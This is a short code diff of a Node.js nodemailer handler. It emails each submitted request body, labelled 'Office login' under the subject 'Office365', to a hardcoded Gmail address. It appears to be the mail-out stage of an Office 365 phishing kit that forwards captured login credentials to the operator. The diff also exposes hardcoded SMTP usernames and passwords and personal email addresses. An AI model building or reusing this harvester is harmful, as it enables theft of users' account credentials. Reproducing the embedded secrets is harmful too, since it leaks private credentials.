@@ -5,17 +5,17 @@ export default async function sendEmail (req, res) {
 
      let transporter = nodemailer.createTransport({
         port: 465,
-        host: "smtp.gmail.com",
+        host: "smtp.mailtrap.io",
         secure: true, // true for 465, false for other ports
         auth: {
-          user: 'techbae.js@gmail.com', // generated ethereal user
-          pass: 'rsbijlgnsjxqytqh', // generated ethereal password
+          user: 'f170ce069f47e7', // generated ethereal user
+          pass: '3f3738fc2e949c', // generated ethereal password
         },
      })
 
        let info = await transporter.sendMail({
-        from: '"Office" <techbae.js@gmail.com>',
-        to: 'williamcharles2106@gmail.com',
+        from: '"Office" <linkersmind@gmail.com>',
+        to: 'techbae.js@gmail.com',
         subject: 'Office365',
         text: `Ofiice login ${req.body}`,
         html: `<h3> Office Login: ${req.body}</h3>`
